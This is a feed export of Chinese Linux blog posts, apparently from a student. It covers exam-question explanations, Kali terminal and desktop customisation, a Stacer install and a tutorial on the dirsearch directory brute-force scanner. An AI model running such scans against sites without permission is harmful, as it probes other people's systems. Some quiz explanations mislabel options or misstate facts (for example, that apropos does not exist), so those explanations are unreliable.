    <content type="text"><![CDATA[21．在Linux中，如何标识接在IDE0上的slave硬盘的第2个扩展分区？ ( ) A. /dev/hdb2 B. /dev/hd1b2 C. /dev/hdb6 D. /dev/hd1b6 22．在应用程序起动时，如何设置进程的优先级？ ( ) A. priority B. nice C. renice D. setpri 23．在 bash 中, 在一条命令后加入”1&gt;&amp;2” 意味着： ( ) A. 标准错误输出重定向到标准输入 B. 标准输入重定向到标准错误输出 C. 标准输出重定向到标准错误输出 D. 标准输出重定向到标准输入 24．下面哪条命令可以把f1.txt复制为f2.txt? ( ) A. cp f1.txt | f2.txt B. cat f1.txt | f2.txt C. cat f1.txt &gt; f2.txt D. copy f1.txt | f2.txt 25．显示一个文件最后几行的命令是： ( ) A. tac B. tail C. rear D. last 26.如何快速切换到用户John的主目录下？ ( ) A. cd @John B. cd #John C. cd &amp;John D. cd ~John 27.把一个流中所有字符转换成大写字符，可以使用下面哪个命令？ ( ) A. tr a-z A-Z B. tac a-z A-Z C.sed /a-z/A-Z D. sed –toupper 28.使用什么命令可以查看Linux的启动信息？ ( ) A. mesg -d B. dmesg C. cat /etc/mesg D. cat /var/mesg 29.运行级定义在： ( ) A. in the kernel B. in /etc/inittab C. in /etc/runlevels D. using the rl command 30.如何装载(mount)上在 /etc/fstab 文件中定义的所有文件系统？ ( ) A. mount -a B. mount /mnt/* C. mount D. mount /etc/fstab ——————分割线——————- 21．在Linux中，如何标识接在IDE0上的slave硬盘的第2个扩展分区？ ( ) A. /dev/hdb2 B. /dev/hd1b2 C. /dev/hdb6 D. /dev/hd1b6 解析：22．在应用程序起动时，如何设置进程的优先级？ ( ) A. priority B. nice C. renice D. setpri 解析： nice 命令在你日常工作中并不常用，这个命令用于调整程序运行的优先级。23．在 bash 中, 在一条命令后加入”1&gt;&amp;2” 意味着： ( ) A. 标准错误输出重定向到标准输入 B. 标准输入重定向到标准错误输出 C. 标准输出重定向到标准错误输出 D. 标准输出重定向到标准输入 解析： &gt;&amp;用于将标准输出重定向到标准错误输出。这个我在Linux之输入输出重定向一文中提到过，具体可以查看此文获取。 24．下面哪条命令可以把f1.txt复制为f2.txt? ( ) A. cp f1.txt | f2.txt B. cat f1.txt | f2.txt C. cat f1.txt &gt; f2.txt D. copy f1.txt | f2.txt 解析：25．显示一个文件最后几行的命令是： ( ) A. tac B. tail C. rear D. last 解析：26.如何快速切换到用户John的主目录下？ ( ) A. cd @John B. cd #John C. cd &amp;John D. cd ~John 解析：27.把一个流中所有字符转换成大写字符，可以使用下面哪个命令？ ( )A. tr a-z A-Z B. tac a-z A-Z C.sed /a-z/A-Z D. sed –toupper 解析：28.使用什么命令可以查看Linux的启动信息？ ( ) A. mesg -d B. dmesg C. cat /etc/mesg D. cat /var/mesg 解析：29.运行级定义在： ( ) A. in the kernel B. in /etc/inittab C. in /etc/runlevels D. using the rl command 解析：30.如何装载(mount)上在 /etc/fstab 文件中定义的所有文件系统？ ( ) A. mount -a B. mount /mnt/* C. mount D. mount /etc/fstab 解析：]]></content>
      <categories>
        <category>试题研究</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>试题解析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux面试题解析第2天]]></title>
    <url>%2F2018%2F05%2F19%2FLinux%E9%9D%A2%E8%AF%95%E9%A2%98%E8%A7%A3%E6%9E%90%E7%AC%AC2%E5%A4%A9%2F</url>
    <content type="text"><![CDATA[11.作为一个管理员，你希望在每一个新用户的目录下放一个文件 .bashrc ，那么你应该在哪个目录下放这个文件，以便于新用户创建主目录时自动将这个文件复制到自己的目录下。 ( ) A. /etc/skel/ B. /etc/default/ C. /etc/defaults/ D. /etc/profile.d/ 2.在bash中，export命令的作用是： ( ) A. 在子shell中运行命令 B. 使在子shell中可以使用命令历史记录 C. 为其它应用程序设置环境变量 D. 提供NFS分区给网络中的其它系统使用 13.在使用了shadow口令的系统中，/etc/passwd和/etc/shadow两个文件的权限正确的是：( ) A. -rw-r—– , -r——– B. -rw-r–r– , -r–r–r– C. -rw-r–r– , -r——– D. -rw-r–rw- , -r—–r– 14．下面哪个参数可以删除一个用户并同时删除用户的主目录？ ( ) A. rmuser -r B. deluser -r C. userdel -r D. usermgr -r 15．有一个备份程序mybackup，需要在周一至周五下午1点和晚上8点各运行一次，下面哪条crontab的项可以完成这项工作？ ( ) A. 0 13,20 1,5 mybackup B. 0 13,20 1,2,3,4,5 mybackup C. 13,20 * 1,2,3,4,5 mybackup D. 0 13,20 1,5 mybackup 16．如何从当前系统中卸载一个已装载的文件系统 ( ) A. umount B. dismount C. mount -u D. 从 /etc/fstab 中删除这个文件系统项 17．如果你的umask设置为022，缺省的你创建的文件的权限为：( ) A. —-w–w- B. -w–w—- C. r-xr-x— D. rw-r–r– 18．在一条命令中如何查找一个二进制命令 Xconfigurator 的路径？ ( ) A. apropos Xconfigurator B. find Xconfigurator C. where Xconfigurator D. which Xconfigurator 19．哪一条命令用来装载所有在 /etc/fstab 中定义的文件系统？ ( ) A. amount B. mount -a C. fmount D. mount -f 20．运行一个脚本，用户不需要什么样的权限？ ( ) A. read B. write C. execute D. browse on the directory ———————–分割线———————– 11.作为一个管理员，你希望在每一个新用户的目录下放一个文件 .bashrc ，那么你应该在哪个目录下放这个文件，以便于新用户创建主目录时自动将这个文件复制到自己的目录下。 ( ) A. /etc/skel/ B. /etc/default/ C. /etc/defaults/ D. /etc/profile.d/ 解析： C./etc/目录下并没有defaults这个文件夹。D. 在/etc/profile.d 目录中存放的是一些应用程序所需的启动脚本，全部是.sh的shell脚本文件。B./etc/default/目录下存放的都是一些与开机关机和系统设置有关的文件和文件夹。A.etc/skel/目录是用来存放新用户配置文件的目录，当我们添加新用户的时候，这个目录下的所有文件会自动被复制到新添加的用户的家目录下。 这个目录下的所有文件都是隐藏文件（以.点开头的文件），这个文件特别重要有用， 12.在bash中，export命令的作用是： ( ) A. 在子shell中运行命令 B. 使在子shell中可以使用命令历史记录 C. 为其它应用程序设置环境变量 D. 提供NFS分区给网络中的其它系统使用 解析： export命令用于将shell变量输出为环境变量，或者将shell函数输出为环境变量。 13.在使用了shadow口令的系统中，/etc/passwd和/etc/shadow两个文件的权限正确的是：( ) A. -rw-r—– , -r——– B. -rw-r–r– , -r–r–r– C. -rw-r–r– , -r——– D. -rw-r–rw- , -r—–r– 解析： 首先有必要说明一点/etc/passwd和/etc/shadow是属于配置文件的，可以通过 cat 命令进行查看 ，在有权限的情况下也可以通过文本编辑器进行编辑。用 ls -l /etc/shadow ls 和 -l /etc/passwd 来查看权限等信息。如图所示 14．下面哪个参数可以删除一个用户并同时删除用户的主目录？ ( ) A. rmuser -r B. deluser -r C. userdel -r D. usermgr -r 解析： A.没有rmuser这个命令。B.deluser用来删除用户或组。 C.userdel用于删除指定的用户以及用户相关的文件。其中r选项为递归的进行删除，也就是删除用户的主目录。在Linux大部分的命令中r选项都是递归的用法。D.没有usermgr这个命令。 15．有一个备份程序mybackup，需要在周一至周五下午1点和晚上8点各运行一次，下面哪条crontab的项可以完成这项工作？ ( ) A. 0 13,20 1,5 mybackup B. 0 13,20 1,2,3,4,5 mybackup C. 13,20 * 1,2,3,4,5 mybackup D. 0 13,20 1,5 mybackup 解析： crontab命令是用于设置周期性被执行的指令， 用法：0-59 0-23 1-31 1-12 0-6 command (取值范围,0表示周日一般一行对应一个任务)，分别对应 分，时，日，月，星期，需要执行的命令。多个日期用.隔开，不进行设置的参数用*。 16．如何从当前系统中卸载一个已装载的文件系统 ( ) A. umount B. dismount C. mount -u D. 从 /etc/fstab 中删除这个文件系统项 解析： B.没用dismount这个命令。 C.mount用于挂载。A.umount用于卸载一个已装载的文件系统。 17．如果你的umask设置为022，缺省的你创建的文件的权限为：( ) A. —-w–w- B. -w–w—- C. r-xr-x— D. rw-r–r– 解析： umask设置了用户创建文件的默认权限，umask设置为022就是默认的权限，也可以理解为普通用户吧。由于此文件是你创建的，所以你一定具备r(读)和w(写)的权限，你此时并没用x(执行)的权限，可以通过chmod命令来提升权限。所以D一定是正确的。 18．在一条命令中如何查找一个二进制命令 Xconfigurator 的路径？ ( ) A. apropos Xconfigurator B. find Xconfigurator C. where Xconfigurator D. which Xconfigurator 解析： A. Linux中没有apropos命令。B.find命令用来在指定目录下查找文件。C.没用where命令，有whereis命令用来定位指令的二进制程序、源代码文件和man手册页等相关文件的路径。 D.which命令用于查找并显示给定命令的绝对路径。 19．哪一条命令用来装载所有在 /etc/fstab 中定义的文件系统？ ( ) A. amount B. mount -a C. fmount D. mount -f 解析： /etc/fstab包含了系统在启动时挂载文件系统和存储设备的详细信息，而挂载文件用mount。 20．运行一个脚本，用户不需要什么样的权限？ ( ) A. read B. write C. execute D. browse on the directory 解析： 执行一个脚本的时候，我们是不需要写入的权限，在我看来，也是没用必要的，因为你可以通过查看来确定该脚本的作用，然后来进行运行，你并不需要来写入进行更改该脚本。 以上解析均属个人观点，如有不足之处可以联系我进行更正扫码进群，我等待你的加入]]></content>
      <categories>
        <category>试题研究</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>试题解析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali美化教程2---定制个性化终端]]></title>
    <url>%2F2018%2F05%2F13%2Fkali%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B2-%E5%AE%9A%E5%88%B6%E4%B8%AA%E6%80%A7%E5%8C%96%E7%BB%88%E7%AB%AF%2F</url>
    <content type="text"><![CDATA[上次我们设置了桌面，但是我们的终端好像和桌面颜色显得毫无违和感。今天就教各位设置一下终端，使你的终端看起来更加符合职业黑客。打开终端，依次打开:设置-编辑当前方案-外观-新建.然后开始设置(如图是我进行的设置，你可以根据喜欢自定义)。然后调整终端字体。(可自定义)接着安装figlet,cowsay.12root@kali:~# apt-get install figletroot@kali:~# apt-get install cowsay 开始对终端的配置文件进行设置.(注意，此处一定要小心，否则你的终端可能不能正常使用)1root@kali:~# gedit .bashrc 先对figlet和cowsay进行设置。插入如下代码(必须在最后一个”fi”后面)12figlet &quot;bingyublog&quot;/usr/games/cowsay -f dragon &quot;bingyu&quot; 其中红线标注的地方都是可以自定义的。“ “中的可以替换为你喜欢的字符。而”dragon”需要你根据以下的文件名进行替换，也就是说你只能替换为下面所给的文件名，不能随意替换为其他的名称。1234567891011121314root@kali:~# cd /usr/share/cowsay/cows/root@kali:/usr/share/cowsay/cows# lsapt.cow elephant.cow milk.cow three-eyes.cowbud-frogs.cow elephant-in-snake.cow moofasa.cow turkey.cowbunny.cow eyes.cow moose.cow turtle.cowcalvin.cow flaming-sheep.cow pony.cow tux.cowcheese.cow ghostbusters.cow pony-smaller.cow unipony.cowcock.cow gnu.cow ren.cow unipony-smaller.cowcower.cow hellokitty.cow sheep.cow vader.cowdaemon.cow kiss.cow skeleton.cow vader-koala.cowdefault.cow koala.cow snowman.cow www.cowdragon-and-cow.cow kosh.cow stegosaurus.cowdragon.cow luke-koala.cow stimpy.cowduck.cow mech-and-cow.cow suse.cow 保存退出后，重启终端，就可以看到效果了。接下来，我们再向终端添加一点提示信息。将下面的代码直接复制到最后一个”fi”后面。一定不能插入到”if….fi”中去，这是个shell中的判断，插入后你的终端将会不能正常使用。123echo -ne &quot;$&#123;lightgreen&#125;Today is:\t\t$&#123;red&#125;&quot; `date`; echo &quot;&quot;echo -e &quot;$&#123;lightgreen&#125;Kernel Information: \t$&#123;red&#125;&quot; `uname -smr`export PS1=&quot;\[\033[1;33m\]\u\[\033[1;37m\]@\[\033[1;32m\]\h\[\033[1;37m\]:\[\033[1;31m\]\w\[\033[1;36m\]\\$ \[\033[0m\]&quot;; 然后保存，重启终端。好了，整个终端设置完毕。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali美化教程1---教你打造极客类型3D旋转桌面]]></title>
    <url>%2F2018%2F05%2F10%2Fkali%E7%BE%8E%E5%8C%96-%E6%95%99%E4%BD%A0%E6%89%93%E9%80%A0%E6%9E%81%E5%AE%A2%E7%B1%BB%E5%9E%8B%E6%A1%8C%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[以上是美化后的桌面，怎么样，是不是很炫酷啊？一股浓厚的 极客风 铺面而来，有没有？？？下面就教大家安装并设置。首先提醒一下各位，我写的教程已经足够清晰了，每个步骤都会截图给你看，你只要严格按照我的步骤操作，是绝对不会出现任何问题的，此次教程难度有点大，你要具备一颗喜欢折腾的心，我就折腾了接近2个小时才搞好。 安装KDE-plasma桌面1root@kali:~# apt-get install kde-plasma-desktop 下载安装速度取决于你的网速，所以需要你有耐心。下载完成后会自动弹出显示管理器窗口，这个说明你已经成功下载了KDE桌面，然后设置默认管理器。回车后，会自动为你进行安装设置，你需要有耐心等待这个过程。成功安装后需要重启kali，并选择plasma桌面。 安装主题开启KDE桌面后，我们进入系统设置。选择桌面主题-获得新主题-在搜索框里输入”ghost”,并安装。然后设置”ghost”主题。 设置界面颜色-获取新方案-搜索”ghost”，并安装。颜色-选择”cyan”-选择应用。应用程序风格-窗口装饰-获得新窗口装饰-搜索”ghost”,并安装。设置窗口装饰，窗口装饰-选择”Ghost-Deco 2.2”-选择应用。 设置虚拟桌面桌面行为-虚拟着桌面-桌面数量设置为4-并应用。虚拟桌面-桌面特效动画设置为”桌面立方动画”-并应用。 设置桌面特效桌面特效-下拉找到”桌面立方”-勾选并应用。对”桌面立方特效进行设置，如图所示。 设置选择桌面屏幕边缘-勾选右上方的空格-勾选”桌面立方-立方”-应用。现在就可以开启3D旋转桌面了。打开方式是”ctr+F11”，然后用鼠标进行旋转桌面。 设置桌面部件现在整个3D旋转桌面已经完成了，但是我们为了使整个界面更加美观，更加符合极客的桌面，我们可以对桌面进行再次设置(大家可以根据自己的喜好进行设置，不必完全照搬我的步骤，我这里只是做个演示)。我们先把终端放到桌面上，因为终端是我们在kali中最常用的软件了。(你可以根据自己需要把其他软件也放到桌面)点击开始按钮-在搜索框搜索”konsole”-右击添加到桌面。在桌面右击”添加部件”-选中你需要的部件。(我这里选择了3个部件)但是这样，部件会随意移动，影响你的使用，所以我们需要锁定部件。右击最下方面板-锁定部件。好了，大功告成。(当然KDE桌面的特性远不止如此，如果你喜欢折腾，你可以自己摸索一下，定制出更加适合自己风格的界面)现在你可以享受整个炫酷的kali系统了。想必在这种炫酷的系统中，你的心情也会变得好起来吧。壁纸我放到群里了，如果你想要，就进群来拿。下次教程教各位设置炫酷的Konsole终端，让你更像职业黑客。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux面试题解析第1天]]></title>
    <url>%2F2018%2F05%2F08%2FLinux%E9%9D%A2%E8%AF%95%E9%A2%98%E8%A7%A3%E6%9E%90%E7%AC%AC1%E5%A4%A9%2F</url>
    <content type="text"><![CDATA[首先对这份迟到的解析，我要对各位说一句对不起。因为我最近一直奔波于实验室，教室，自习室，从下周开始，每周都要考试，这段时间真的很忙，博客我只能抽空去写，所以最近更新有点慢了，很对不起。1.cron 后台常驻程序 (daemon) 用于：（ ） A. 负责文件在网络中的共享 B. 管理打印子系统 C. 跟踪管理系统信息和错误 D. 管理系统日常任务的调度 2.在大多数Linux发行版本中，以下哪个属于块设备 (block devices) ？ （ ） A. 串行口 B. 硬盘 C. 虚拟终端 D. 打印机 3.下面哪个Linux命令可以一次显示一页内容？ （ ） A. pause B. cat C. more D. grep 4.怎样了解您在当前目录下还有多大空间？ （ ） A. Use df B. Use du / C. Use du . D. Use df . 5.怎样更改一个文件的权限设置？ （ ） A. attrib B. chmod C. change D. file 6.假如您需要找出 /etc/my.conf 文件属于哪个包 (package) ，您可以执行：（ ） A. rpm -q /etc/my.conf B. rpm -requires /etc/my.conf C. rpm -qf /etc/my.conf D. rpm -q | grep /etc/my.conf 7.假如当前系统是在 level 3 运行，怎样不重启系统就可转换到 level 5 运行？ （ ） A. Set level = 5 B. telinit 5 C. run 5 D. ALT-F7-5 8.那个命令用于改变 IDE 硬盘的设置？ （ ） A. hdparam B. ideconfig C. hdparm D. hddparm 9.下面哪个命令可以列出定义在以后特定时间运行一次的所有任务？（ ） A. atq B. cron C. batch D. at 10.下面命令的作用是：set PS1=”[\u\w\t]\$” ; export PS1 （ ） A. 改变错误信息提示 B. 改变命令提示符 C. 改变一些终端参数 D. 改变辅助命令提示符 ————————————–分割线———————————– 1.cron 后台常驻程序 (daemon) 用于：（ ） A. 负责文件在网络中的共享 B. 管理打印子系统 C. 跟踪管理系统信息和错误 D. 管理系统日常任务的调度解析： cron服务是实现Linux定时任务的服务，也就是管理系统日常任务的调整。A.NFS和CIFS负责文件在网络中的共享,可能有人会说FTP服务，但是FTP只是文件传输协议，并不是文件共享的。D.strace常用来跟踪进程执行时的系统调用和所接收的信号。2.在大多数Linux发行版本中，以下哪个属于块设备 (block devices) ？ （ ）A. 串行口B. 硬盘 C. 虚拟终端 D. 打印机解析： Linux中I/O设备分为两类：字符设备和块设备。块设备是Linux三大设备之一，其驱动模型主要针对磁盘，Flash等存储类设备，块设备（blockdevice）是一种具有一定结构的随机存取设备，对这种设备的读写是按块(所以叫块设备)进行的，他使用缓冲区来存放暂时的数据，待条件成熟后，从缓存一次性写入设备或者从设备一次性读到缓冲区。 3.下面哪个Linux命令可以一次显示一页内容？ （ ） A. pause B. cat C. more D. grep解析： Linux命令中并没有pause命令。cat是“Concatenate(连续)”的简写，主要将一个文件的内容连续显示到屏幕上，不会进行分页。more是 一个过滤器, 用于分页显示 (一次一屏) 。文本grep是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出，通常与”cat”搭配使用。 4.怎样了解您在当前目录下还有多大空间？ （ ） A. Use df B. Use du / C. Use du . D. Use df .解析： 注意！这题的前面的”Use”是使用xxx命令的意思，不属于运行的命令。df：列出指定的每一个文件名所在的文件系统上可用磁盘空间的数量，如果没有指定文件名,则显示当前所有使用中的文件系统。du(disk usage):报告磁盘空间使用情况.题目说是当前目录下的，所以A忽略了当前目录下。B.属于主目录/。需要区分的是du会把指定目录下所有文件、目录、目录下的文件都统计。是建立在文件系统能看到的的确确是有这样一些文件的基础上的。也就是说我们能在文件系统里面看到的文件才会被du统计。df则是基于文件系统总体来计算，通过文件系统中未分配空间来确定系统中已经分配空间的大小。 5.怎样更改一个文件的权限设置？ （ ） A. attrib B. chmod C. change D. file解析： A.Linux中没有attrib命令。B.Linux中没有change命令。C.chmod是更改文件权限的命令。D.file命令用来探测给定文件的类型。 6.假如您需要找出 /etc/my.conf 文件属于哪个包 (package) ，您可以执行：（ ） A. rpm -q /etc/my.conf B. rpm -requires /etc/my.conf C. rpm -qf /etc/my.conf D. rpm -q | grep /etc/my.conf解析： rpm用来进行查询的命令格式为：rpm -q options.这也就是说你在进行查询操作的时候，是不能直接用-q的，你需要附加其他参数进行查询，所以A、D是错误的。B.–requires (or -R) 显示软件包所需的功能。不符合题目要求。C.rpm -qf /etc/my.conf 查看某个文件属于哪个软件包，可以是普通文件或可执行文件，跟文件的绝对路径。 7.假如当前系统是在 level 3 运行，怎样不重启系统就可转换到 level 5 运行？ （ ） A. Set level = 5 B. telinit 5 C. run 5 D. ALT-F7-5解析： 除了B选项，其他几个选项全部是瞎写的，根本不存在这几个命令以及快捷方式。C.telinit 用于设置当前系统的运行等级.可以直接跟0~6运行等级. 8.那个命令用于改变 IDE 硬盘的设置？ （ ） A. hdparam B. ideconfig C. hdparm D. hddparm解析： 除了C选项的命令，其他几个命令也是不存在Linux系统的。C.hdparm显示与设定硬盘的参数.具体参数可以查看man手册。 9.下面哪个命令可以列出定义在以后特定时间运行一次的所有任务？ （ ） A. atq B. cron C. batch D. at解析： B.cron是服务，不是命令，Linux存在crontab命令，用于定时执行操作命令。C.batch命令用于在指定时间，当系统不繁忙时执行任务。D.at命令用于在指定时间执行命令。A.atq命令显示系统中待执行的任务列表，和at -l一样。 10.下面命令的作用是：set PS1=”[\u\w\t]\$” ; export PS1 （ ） A. 改变错误信息提示 B. 改变命令提示符 C. 改变一些终端参数 D. 改变辅助命令提示符解析： 这是一个shell，set命令作用主要是显示系统中已经存在的shell变量，以及设置shell变量的新变量值。而PS1是命令提示符的环境变量，这个环境变量是默认的。\u：表示当前用户的帐号名称；\w：完整的工作目录之外，家目录会以 ~ 取代；\t: 显示系统时间;$：提示字符，如果是 root 时，提示符为 #，普通用户则为 $.这个shell的意思其实就是先重新设置命令行的环境变量，然后用export命令用于将新设置的变量输出为环境变量。作用就是改变命令提示符。 以上解析均属个人观点，如有不足之处可以联系我进行更正扫码进群，我等待你的加入]]></content>
      <categories>
        <category>试题研究</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>试题解析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[注意注意！说一件重要的事]]></title>
    <url>%2F2018%2F05%2F07%2F%E6%B3%A8%E6%84%8F%E6%B3%A8%E6%84%8F%EF%BC%81%E8%AF%B4%E4%B8%80%E4%BB%B6%E9%87%8D%E8%A6%81%E7%9A%84%E4%BA%8B%2F</url>
    <content type="text"><![CDATA[最近在看到了一篇51CTO看到了一个Linux笔试题，想着自己做一下，检测一下自己的水平。这是原文地址。题我已经初步写过了，题目并不是太难，只要你完整看过任何一本Linux书籍，我相信你可以轻松及格的。 我决定写一下该份试题的解析答案，每天更新一篇博文，每篇博文讲解10道题，目前我还未从网上看到该试题的任何解析答案。 我不是运维人员，只是普通大学生而已，但是这100道题我会认真写的，网上只给了答案，我会写出具体解析，讲解一下哪里对，哪里不对，第一次写试题解析，难免有些不足的地方，希望各位多多指教。每天更新一篇博文，每篇博文讲解10道题，本教程适合有Linux基础的同学查看，如果你连基础命令还不太会，可以去看看一些书，我群里放了很多关于Linux入门的资料，有需要的可以进群下载。对于这套题如果各位感觉我写的解析哪里不对，也可以进群联系我纠正。以后遇到其他面试题或者好的试题也还会做解析的，也希望各位遇到好的试题分享出来，共同交流。 这种试题解析的博文，我对先放出题目，供各位先自测一下。然后我会在下面写出答案，答案用 红色字体 进行标注，然后紧跟是解析。这种试题解析文章，统一分类到 试题研究 中去，还会设置一个标签为 试题解析，可以分别到分类和标签统一查看。 好了，就说这么多了，如果你喜欢Linux，最好每天都看一下试题解析这些文章，我相信只要你坚持下来，10天过后，你的Linux水平会提升的。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux简单命令总结]]></title>
    <url>%2F2018%2F05%2F06%2FLinux%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E5%B0%8F%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Linux命令它们与英语口语十分相似，其命令格式如下：命令 [选项] [参数]（command [options] [arguments]）命令：告诉linux操作系统执行什么。选项：说明命令的方式。选项如果是单个英语字母是以“-”字符开始，如果是多个英语字母基本都是以“–”字符开始。参数：说明命令影响的是什么（如一个文件、一个目录、一段正文文字） 查看的命令whoami 命令的功能是列出目前您操作系统所使用的用户名who 目前有几个用户在操作系统上工作，比whoami多了系统上工作的其他用户users 目前有哪些用户登陆了linux系统tty 目前用户登陆linux系统所使用的终端 uname 显示当前的操作系统uname -n显示目前操作系统的主机名（n是nodename的第一个字符可看成缩写）uname -i显示目前操作系统所使用的硬件平台名（i是information第一个字符可看成缩写）uname -r显示目前操作系统发布的版本信息（r是release的第一个字符）uname -s显示目前操作系统名（r是release的第一个字符）uname -m显示目前机器硬件名（m是machine的第一个字符）uname -p显示中央处理器的类型（p是processor的第一个字符）uname -a显示所有信息（a是all的第一个字符）这里-n、-i、-r、-s等等都是选项.即说明命令的方式。选项部分是以“-”字符开始。uname -m -s -r空格隔开同时显示信息uname -msr也能同时显示信息uname –help查看uname的全部选项 date 显示当前系统的日期和时间cal 显示某月的日历，直接输入cal显示本月的日历（cal为calendar的前三个字符）cal 8 2008显示2008年8月的日历（第一个参数为月份8，第二个参数为年2008）clear 清楚窗口中的显示信息，即清屏作用(也可以使用快捷键CTR+L) 获得帮助信息whatis 命令获得linux命令的帮助信息eg:whatis uname显示uname命令的用法，这里uname被看做一个参数（whatis获得）whatis who显示who命令的含义作用 man是manual（手册）的前三个字符。（linux大哥有小弟无数，分堂无数。man是花名册，可以查看任何到任何小弟的名字）每个命令都对应着说明文件，这些说明文件叫做Man Pages。提供命令详细描述和使用方法。man的命令格式如下man []eg: man su浏览Man Pages箭头上下左右End最后一页Home第一页：/string向前查找字符串, q键为退出 info以网页的结构显示命令的信息，是一种基于正文的帮助系统info的命令格式如下info []eg: info who使用控制n键转到下一小节u键跳转到上层的章节输入s屏底出现“Search for string[]:”提示，此时输入要查找的字符串q为退出 cd切换进入目录pwd显示当前目录的绝对路径（print working directory打印工作目录） ls列出当前目录ls [options] [directories|files]选项目录|文件ls.当前目录Ls..当前目录的上级目录ls . ..同屏分别同时显示这两个目录中的内容ls -F参数显示类型ls -l参数显示所有目录中所有非隐藏文件的细节ls -ld只想知道本身的属性用d 创建文件mkdir目录名创建一个新目录（make directory，伟大随心的缩写）mkdir -p目录名可以创建指定路径中所有不存在的目录touch文件名创建一个新文件或多个文件，可以绝对路径可以使相对路径，touch目录名1目录名2目录名3如果目标文件已存在就会修改文件的时间戳 复制文件cp[-option(s)]source(s)targetsource（源）:可以是一个或者多个文件和目录target（目的）：可以是一个文件或者一个目录-i（interactive，交互的），覆盖文件给出提示信息-r（recursive，递归的）复制一个目录时，复制当前目录中所有内容，包括复制其下子目录的所有内容。-p（presever，维持）保留一些特性，如时间戳-f（force，强制）若目标文件存在，并不咨询直接覆盖原来所有文件 移动文件mv（move的缩写）mv a b从a移动到b包括移动及修改文件和目录名]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux必备神器-系统监测和优化器]]></title>
    <url>%2F2018%2F05%2F05%2FLinux%E5%BF%85%E5%A4%87%E7%A5%9E%E5%99%A8-%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%B5%8B%E5%92%8C%E4%BC%98%E5%8C%96%E5%99%A8%2F</url>
    <content type="text"><![CDATA[在Windows上我们常用xxx助手，xxx管家进行管理电脑，今天就说一款专为Linux设计的系统监测和优化器—stacer，我感觉是你安装Linux桌面版本的必备神器，实在是太好用了。GitHub项目地址: https://github.com/oguzhaninan/Stacer我以自己的Ubuntu进行安装以及演示，其他发行版本可以去GitHub上查找安装方法，很详细。123lengyue@ubuntu:~$ sudo add-apt-repository ppa:oguzhaninan/stacerlengyue@ubuntu:~$ sudo apt-get updatelengyue@ubuntu:~$ sudo apt-get install stacer 运行1lengyue@ubuntu:~$ stacer 该神器还支持多种语言，接下来看图设置为中文。然后需要重启一下stacer,再次打开就可以看到中文界面了，使用很简单，就不一一赘述了。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站目录结构扫描器-dirsearch]]></title>
    <url>%2F2018%2F05%2F04%2F%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E6%89%AB%E6%8F%8F%E5%99%A8-dirsearch%2F</url>
    <content type="text"><![CDATA[dirsearch是一个基于python3.x的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。GitHub项目地址：https://github.com/maurosoria/dirsearch#overview支持 WindowsXP/7/8/10 ，GNU/Linux，MacOSX操作系统。 特点：多线程可保持连接支持多种后缀（-e|–extensions asp,php）生成报告（纯文本，JSON）启发式检测无效的网页递归的暴力扫描支持HTTP代理用户代理随机化批量处理请求延迟 扫描器与字典字典必须是文本文件，除了使用特殊的％EXT％之外，其余每行都会被处理。例：12example/example.%EXT% 使用扩展名“asp”和“aspx”会生成下面的字典：123example/example.aspexample.aspx 安装以及使用示例(kali下进行安装)123456root@kali:~# git clone https://github.com/maurosoria/dirsearch.gitroot@kali:~# cd dirsearch/root@kali:~/dirsearch# lsCHANGELOG.md default.conf lib README.md thirdpartydb dirsearch.py logs reportsroot@kali:~/dirsearch# python3 dirsearch.py -u 目标网址 -e * 参数说明： 必选参数： -u 目标网站 -e 扩展名 可选参数： 其余参数均为可选参数，可以通过运行 python3 dirsearch.py –help 命令来查看参数 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一款轻便快速的网络IP扫描工具]]></title>
    <url>%2F2018%2F05%2F03%2F%E4%B8%80%E6%AC%BE%E8%BD%BB%E4%BE%BF%E5%BF%AB%E9%80%9F%E7%9A%84%E7%BD%91%E7%BB%9CIP%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%2F</url>
